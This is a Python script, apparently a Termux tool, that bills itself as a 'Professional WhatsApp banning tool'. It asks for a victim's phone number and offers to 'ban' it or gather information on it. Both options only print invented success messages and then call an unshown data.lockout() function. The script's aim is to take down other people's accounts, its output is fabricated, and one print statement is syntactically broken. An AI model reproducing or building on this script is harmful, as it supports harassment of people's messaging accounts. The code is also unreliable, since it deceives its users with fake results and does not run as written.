# 𝘗𝘳𝘰𝘧𝘦𝘴𝘴𝘪𝘰𝘯𝘢𝘭 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘛𝘰𝘰𝘭𝘴
# 𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘣𝘺 𝘛𝘦𝘢𝘮 𝘛𝘦𝘤𝘩 𝘋𝘪𝘨𝘪𝘵𝘢𝘭
#
import os
import time
import sys
import data

print("Installing packages . . .")
os.system("clear")
os.system("pkg install cmatrix")
os.system("pip3 install colorama")
os.system("clear")
#
# Now importing colorama
#
import colorama
from colorama import Fore
#
def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)
def banner_display():
    print(f''' {Fore.CYAN}

██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗
██║░░░██║██╔════╝████╗░██║██╔══██╗████╗░████║
╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║██╔████╔██║
░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║
░░╚██╔╝░░███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝
   {Fore.YELLOW}                                                              
𝘴𝘤𝘳𝘪𝘱𝘵 𝘤𝘳𝘦𝘢𝘵𝘦 𝘣𝘺 𝘈𝘳𝘺𝘢𝘯 
𝘤𝘰𝘯𝘵𝘢𝘤𝘵 𝘶𝘴: T.me/Ikvenom
𝘗𝘳𝘰𝘧𝘦𝘴𝘴𝘪𝘰𝘯𝘢𝘭 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘣𝘢𝘯𝘯𝘪𝘯𝘨 𝘵𝘰𝘰𝘭𝘴
{Fore.CYAN}
*************************************************
   {Fore.WHITE} ''')
banner_display()
#
#
def program():
    number = input("[+] 𝘗𝘶𝘵 𝘕𝘶𝘮𝘣𝘦𝘳 𝘸𝘪𝘵𝘩 𝘤𝘰𝘶𝘯𝘵𝘳𝘺 𝘤𝘰𝘥𝘦 𝘭𝘪𝘬𝘦 +91: +")
    realnumber = "+"+number
    check = number.isnumeric()
    lennber = len(number)
    if (check == True):
        if (lennber < 10 or lennber > 10):
            delay_print(f"{Fore.RED}𝘕𝘶𝘮𝘣𝘦𝘳 𝘮𝘶𝘴𝘵 𝘣𝘦 10 𝘥𝘪𝘨𝘪𝘵𝘴\n")
            program()
        elif (lennber==10):
            delay_print(f"{Fore.GREEN}1) 𝘉𝘢𝘯 𝘯𝘶𝘮𝘣𝘦𝘳\n")
            delay_print(f"{Fore.RED}2) 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯 𝘢𝘣𝘰𝘶𝘵 𝘵𝘩𝘪𝘴 𝘯𝘶𝘮𝘣𝘦𝘳\n")
            option = input(f"{Fore.GREEN}[+] 𝘊𝘩𝘰𝘰𝘴𝘦 𝘢𝘯 𝘰𝘱𝘵𝘪𝘰𝘯: ")
            if (option=="1"):
                delay_print(f"{Fore.RED}𝘈𝘳𝘦 𝘺𝘰𝘶 𝘴𝘶𝘳𝘦 𝘵𝘰 𝘣𝘢𝘯 "+realnumber+"?\n")
                yesorno1 = input("(Y/N): ")
                delay_print("8579 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘴𝘦𝘯𝘥 𝘯𝘶𝘮𝘣𝘦𝘳+" 𝘸𝘪𝘭𝘭 𝘣𝘦 𝘣𝘢𝘯𝘯𝘦𝘥 𝘪𝘯 𝘭𝘦𝘴𝘴 𝘵𝘩𝘢𝘯 8 𝘩𝘰𝘶𝘳𝘴!")
                data.lockout()

            elif (option=="2"):
                delay_print(f"{Fore.YELLOW}Gather 𝘪𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯 𝘧𝘰𝘳 "+realnumber+"?\n")
                yesorno2 = input("(Y/N): ")
                delay_print("Name: 47hxl-53r\nStatus: 𝘛𝘢𝘬𝘦 𝘋𝘰𝘸𝘯 𝘣𝘺 𝘝𝘦𝘕𝘰𝘔")
                data.lockout()

            else:
                delay_print(f"{Fore.RED}𝘐𝘵'𝘴 𝘯𝘰𝘵 𝘢𝘯 𝘰𝘱𝘵𝘪𝘰𝘯\n")
                program()


    else:
        delay_print(f"{Fore.RED}Number 𝘪𝘴 incorrect... 𝘗𝘭𝘦𝘢𝘴𝘦 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯 . . .\n")
        print("")
        program()
program()
